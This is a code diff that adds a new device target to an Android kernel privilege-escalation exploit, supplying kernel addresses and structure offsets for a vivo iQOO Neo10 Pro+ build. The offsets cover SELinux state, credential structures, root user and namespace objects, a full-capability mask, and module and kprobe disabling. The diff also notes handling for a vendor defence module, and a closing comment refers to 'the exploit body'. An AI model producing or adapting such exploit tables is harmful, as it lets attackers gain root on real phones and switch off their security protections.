@@ -297,6 +297,55 @@ static const struct target g_targets[] = {
         .kprobes_disarm_static = 0xffffffc08237ee80ULL,
         .kptr_restrict_static = 0ULL, /* hooks_defend present; see above */
     },
+    {
+        /*
+         * 6.6.127-android15-8-gd489d4ad2a70-abogki567717946-4k
+         * vivo iQOO Neo10 Pro+ (PD2463) OriginOS 7, 17.2.9.12.W10.V000L1.
+         * Derived from the build's kernel Image (kallsyms via
+         * vmlinux-to-elf, capstone disassembly, BTF). Same GKI base as
+         * g24b70dd1cb81: every .data static is unchanged, the text block
+         * shifted slightly (do_timer_create +0x1c, kmem_cache_alloc
+         * +0x324), and the BTF blob grew by 1423 bytes with identical
+         * layouts (task_struct 0x12c0 cred@0x820, cred 0xb8 uid@0x8,
+         * k_itimer 0x108 it_signal@0x60, signal_struct.posix_cputimers
+         * @0x120).
+         *   - timer site: ldr x0,[posix_timers_cache] + bl
+         *     kmem_cache_alloc at do_timer_create+0xa4, call_site (ret)
+         *     0xffffffc080198000 -> 0x198000;
+         *   - copy_process: bl kmem_cache_alloc_node ret +0x140 ->
+         *     0xac790 (unchanged);
+         *   - __tracepoint_sys_exit 0xffffffc0822f3760;
+         *   - hooks_defend.ko handling carried over from g24b70dd1cb81
+         *     (kptr_restrict_static = 0; the chain is kallsyms-free and
+         *     loads no modules).
+         */
+        .prefix = "6.6.127-android15-8-gd489d4ad2a70",
+        .static_timer_site = 0xffffffc080198000ULL,
+        .timer_site_low21 = 0x198000ULL,
+        .selinux_state_static = 0xffffffc08239a170ULL,
+        .panic_on_warn_static = 0xffffffc08214ac0cULL,
+        .copy_process_low21 = 0xac790ULL,
+        .root_user_static = 0xffffffc08216f108ULL,
+        .init_user_ns_static = 0xffffffc08216ee78ULL,
+        .init_ucounts_static = 0xffffffc082170bd8ULL,
+        .init_groups_static = 0xffffffc082170668ULL,
+        .tp_sys_exit_static = 0xffffffc0822f3760ULL,
+        .timer_alloc = 0x108ULL,
+        .cred_req = 0xb8ULL,
+        .cred_alloc = 0xc0ULL,
+        .cred_uid_off = 0x8ULL,
+        .off_task_cred = 0x820ULL,
+        .task_alloc_bytes = 0x12c0ULL,
+        .fullcap = 0x1ffffffffffULL,
+        .selinux_blob_off = 0x0ULL,
+        .selinux_sid_kernel = 1U,
+        .vr_tag_a_off = 0x06ULL,
+        .vr_tag_b_off = 0x2cULL,
+        .tracepoint_funcs_off = 0x48ULL,
+        .modules_disabled_static = 0xffffffc08237b800ULL,
+        .kprobes_disarm_static = 0xffffffc08237ee80ULL,
+        .kptr_restrict_static = 0ULL, /* hooks_defend present; see above */
+    },
 };
 
 /* Accessor macros: the exploit body keeps using the old constant names. */
